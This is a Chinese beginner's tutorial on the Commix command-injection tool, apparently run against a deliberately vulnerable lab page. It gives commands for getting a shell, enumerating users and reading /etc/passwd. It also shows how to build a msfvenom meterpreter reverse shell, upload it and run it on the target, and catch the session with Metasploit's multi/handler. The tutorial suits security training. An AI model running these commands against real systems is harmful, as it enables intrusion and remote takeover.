## Commix-Command Injection Exploiter（初学者指南）

### **命令注入简介** [^1]

### **Commix简介** [^2]

### **Commix中的命令注入类型**

- **基于结果的命令注入**
  - 基于经典结果的注入 [^3]
  - 基于Eval的技术 [^4]

- **盲命令注入**
  - 基于时间的技术 [^5]
  - 基于文件的技术 [^6]

### 实验

`commix –h`

`commix -u <URL>` [^7]

`commix -u http://192.168.1.100/commandexec/example.php?/ip=127.0.0.1`

`commix -u <URL> --batch`

`commix -u <URL> --all `[^8]

`commix –u <URL> --current-user` [^9]

`commix –u <URL> --hostname` [^10]

`commix –u <URL> --is-root `[^11]

`commix –u <URL> --sys-info` [^12]

`commix –u <URL> --users` [^13]

`commix –u <URL> --is-admin`

`commix –u <URL> --file-read=/etc/passwd`

### 使用BurpSuite捕获提交的请求的cookie

`commix –u <URL> --cookie="security=low; PHPSESSID=2r9avccki91i3uq2eqlud8sg08" --data="ip=127.0.0.1&Submit=Submit"`

### 使用msfvenom创建恶意软件文件

`msfvenom –p python/meterpreter/reverse_tcp lhost=192.168.1.11 lport=1234 –f raw > venom.py`

### 使用以下命令将其上载到目标中

`commix -u <URL> --cookie="PHPSESSID=4029asg19ejeuibfq30d7lc1o8; security=low" --data="ip=127.0.0.1&Submit=Submit" --file-write="/root/venom.py" --file-dest="/tmp/venom.py" --os-cmd="python /tmp/venom.py"`

```bash
# 您可以使用multi / handler来获取会话，为此使用以下命令集
use exploit/multi/handler
set payload python/meterpreter/reverse_tcp
set lhost eth0
set lport 1234
run
```

[原文](https://www.hackingarticles.in/commix-command-injection-exploiter-beginners-guide/)

---

[^1]: 命令注入也称为shell注入或OS注入。命令注入是10大OWASP漏洞之一。这是一种攻击，其中主机操作系统的任意命令通过易受攻击的应用程序执行。当Web应用程序将不安全的用户数据发送到系统shell时，可能会发生此类攻击。此用户数据可以是任何形式，例如表单，cookie，HTTP标头等。由于输入验证不充分，漏洞命令注入大多增加。在此攻击中，应用程序的默认功能由攻击者扩展，然后攻击者使用注入代码执行系统命令，这使代码注入与代码注入不同
[^2]: Commix工具是自动化的，用于利用Web应用程序中命令注入的漏洞。这个工具是用python编写的，这意味着它与Linux，windows和mac 兼容。它预装在Kali Linux，BlackArch和Parrot OS中。此工具可以很容易地找到与命令注入相关的漏洞，然后进一步利用它们
[^3]: 这是最常用的命令注入类型，并且是最简单的。在这里，使用了几个常见的操作符，它们将正版命令与注入的命令链接在一起，或者完全排除初始命令，然后继续执行注入的命令。这进一步分为3类，即Shellshock，ICMP exfiltration，DNS exfiltration
[^4]: 在目标Web应用程序易受eval（）函数攻击的情况下使用此技术。该eval函数用于执行在运行时期间在所述函数中定义的特殊代码。
[^5]: 使用此技术将延迟执行注入的命令的时间。通过检查应用程序恢复所花费的时间将使攻击者能够确定命令是否成功执行
[^6]: 如果您无法通过其反应来确定Web应用程序的结果，那么这种技术会派上用场，因为它将允许您编写要在文件中可访问的命令集。攻击者。工作的这种技术类似于基于结果技术
[^7]: 通过URL进行commix会话,使用此命令可以获得一个commix（os_shell）
[^8]: 要获取有关目标的所有基本信息
[^9]: 目标的当前用户
[^10]: 找到主机名
[^11]: 确定外部目标是否有root
[^12]: 获取有关系统的信息
[^13]: 获取有关用户的信息